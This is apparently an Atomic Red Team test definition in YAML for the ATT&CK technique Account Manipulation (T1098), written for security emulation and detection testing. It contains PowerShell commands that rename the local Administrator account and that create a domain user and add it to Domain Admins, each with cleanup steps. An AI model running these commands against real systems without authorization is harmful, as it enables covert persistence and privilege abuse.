attack_technique: T1098
display_name: Account Manipulation
atomic_tests:
- name: Admin Account Manipulate
  auto_generated_guid: 5598f7cb-cf43-455e-883a-f6008c5d46af
  description: |
    Manipulate Admin Account Name
  supported_platforms:
  - windows
  executor:
    command: |
      $x = Get-Random -Minimum 2 -Maximum 9999
      $y = Get-Random -Minimum 2 -Maximum 9999
      $z = Get-Random -Minimum 2 -Maximum 9999
      $w = Get-Random -Minimum 2 -Maximum 9999
      Write-Host HaHa_$x$y$z

      $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

      foreach($member in $fmm) {
          if($member -like "*Administrator*") {
              $account = $member.Name -replace ".+\\\","" # strip computername\
              $originalDescription = (Get-LocalUser -Name $account).Description
              Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
              Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
              Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
              }
          }
    cleanup_command: |
      $list = Get-LocalUser |?{$_.Description -like "atr:*"}
      foreach($u in $list) {
        $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
        Set-LocalUser -Name $u.Name -Description $Matches.Description
        Rename-LocalUser -Name $u.Name -NewName $Matches.Name
        Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
      }
    name: powershell
    elevation_required: true

- name: Domain Account and Group Manipulate
  auto_generated_guid: a55a22e9-a3d3-42ce-bd48-2653adb8f7a9
  description: |
    Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). 
    
    The quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,
    you need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to 
    create the user and alter the group. Automatic installation of the dependency requires an elevated session, 
    and is unlikely to work with Powershell Core (untested).

    If you consider running this test against a production Active Directory, the good practise is to create a dedicated
    service account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated
    as group manager of the target group.

    Example: `Invoke-AtomicTest -Session $session 'T1098' -TestNames "Domain Account and Group Manipulate" -InputArgs @{"group" = "DNSAdmins" }`
  supported_platforms:
  - windows
  input_arguments:
    account_prefix:
      description: |
        Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on
        a match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.
      type: String
      default: atr-
    group:
      description: Name of the group to alter
      type: String
      default: "Domain Admins"
    create_args:
      description: Additional string appended to New-ADUser call 
      type: String
      default: ""
  dependencies:
  - description: |
      PS Module ActiveDirectory
    prereq_command: |
      Try {
          Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
          exit 0
      } 
      Catch {
          exit 1
      }
    get_prereq_command: |
      if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
        Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
      } else {
        Install-WindowsFeature RSAT-AD-PowerShell
      }
  executor:
    command: |
      $x = Get-Random -Minimum 2 -Maximum 99
      $y = Get-Random -Minimum 2 -Maximum 99
      $z = Get-Random -Minimum 2 -Maximum 99
      $w = Get-Random -Minimum 2 -Maximum 99

      Import-Module ActiveDirectory
      $account = "#{account_prefix}-$x$y$z"
      New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
      Add-ADGroupMember "#{group}" $account
    cleanup_command: |
      Get-ADUser -LDAPFilter "(&(samaccountname=#{account_prefix}-*)(givenName=Test))" | Remove-ADUser -Confirm:$False
    name: powershell

